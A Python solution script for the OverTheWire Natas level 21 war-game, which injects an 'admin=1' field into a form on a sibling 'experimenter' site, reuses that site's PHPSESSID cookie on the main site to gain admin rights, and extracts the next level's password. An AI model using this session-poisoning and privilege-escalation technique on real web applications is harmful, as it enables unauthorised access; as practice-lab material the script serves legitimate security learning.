import requests
import re

url_main = "http://natas21.natas.labs.overthewire.org/"
url_experiment = "http://natas21-experimenter.natas.labs.overthewire.org/?debug"

auth  = ("natas21", "secret")

def exploit():
    session = requests.Session() # creating session that saving cookie and working like browser page
    session.auth = auth

    print("[*] Sending poisoing POST request for expirement url...")
    payload = {
        "align": "center",
        "fontsize": "100%",
        "bgcolor": "yellow",
        "submit": "Update",
        "admin": "1"
    }

    res_post = session.post(url_experiment, data=payload, timeout=5) # Sending POST request to field

    if res_post.status_code != 200:
        print(f"[-]Error to connect the server. Error: {res_post.status_code}")
        return
    print("[+]Successfully connected to server!")
    
    if "[admin] => 1" in res_post.text:
        print("[+]Session successfilly poinosed!")
    else:
        print("[-]Something went wrong. Check response.")
        return
    
    print("[*] Requesting main page with poisoned session. . .")
    try:
        phpsessid_value = session.cookies.get("PHPSESSID", domain="natas21-experimenter.natas.labs.overthewire.org") # getting cookie from our "PHPSESSID" in expirement website

        if not phpsessid_value:
            phpsessid_value = session.cookies.get("PHPSESSID")

        session.cookies.set("PHPSESSID", phpsessid_value, domain="natas21.natas.labs.overthewire.org") # write our cookie from expirement website in "PHPSESSID" in main website
        print(f"[+]Cookie forced: PHPSESSID={phpsessid_value}")
    except Exception as e:
        print(f"[-]Failed to copy cookie: {e}")
        
    res_get = session.get(url_main, timeout=5)

    flag = re.search(r"the password for natas 22 is ([A-Za-z0-9]{32})", res_get.text, re.IGNORECASE) # searching a line with that text and word with 32 letters after text

    print("-" * 55)
    if flag:
        print(f"Congratulations! The password was finded! The password is: {flag.group(1)}")
    else:
        print("Password not finded in GET response with script. Printing full response text:")
        print(res_get.text)
    print("-" * 55)

if __name__ == "__main__":
    exploit()